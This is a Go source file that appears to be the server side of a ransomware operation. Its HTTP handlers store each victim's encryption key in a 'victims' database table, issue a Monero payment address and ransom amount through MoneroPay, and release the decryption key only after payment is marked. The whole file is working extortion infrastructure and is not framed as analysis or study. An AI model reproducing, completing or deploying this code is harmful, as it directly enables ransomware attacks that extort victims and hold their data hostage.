package main

import (
	"net/http"
	"log"
	"fmt"
	"strings"

	"github.com/go-chi/chi/v5"
	"gitlab.com/moneropay/go-monero/walletrpc"
)

// Saves the encryption key to the database and responds with a Monero address
// and amount to be paid.
func encryptHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	row, err := pdbQueryRow(r.Context(),
	    "INSERT INTO victims (key) VALUES ($1) RETURNING id",
	    r.FormValue("key"))
	if err != nil {
		log.Println("Failed to save victim's key:", err)
		writeError(w, err)
		return
	}
	var id string
	if err := row.Scan(&id); err != nil {
		log.Println("Failed to save victim's key:", err)
		writeError(w, err)
		return
	}
	address, err := createMoneroPayRequest(id, Conf.amount)
	if err != nil {
		log.Println("Failed to get address from MoneroPay:", err)
		writeError(w, err)
		return
	}
	fmt.Fprintf(w, "%s %s %s", id, address, strings.TrimRight(walletrpc.XMRToDecimal(Conf.amount), "0"))
}

// If the amount was paid, responds retrieves the key for the given id.
func decryptHandler(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	row, err := pdbQueryRow(r.Context(), "SELECT key, paid FROM victims WHERE id = $1", id)
	if err != nil {
		log.Println("Failed to query database:", err)
		writeError(w, err)
		return
	}
	var (
		paid bool
		key string
	)
	if err := row.Scan(&key, &paid); err != nil {
		log.Println("Failed to query database:", err)
		writeError(w, err)
		return
	}
	if !paid {
		return
	}
	fmt.Fprint(w, key)
}
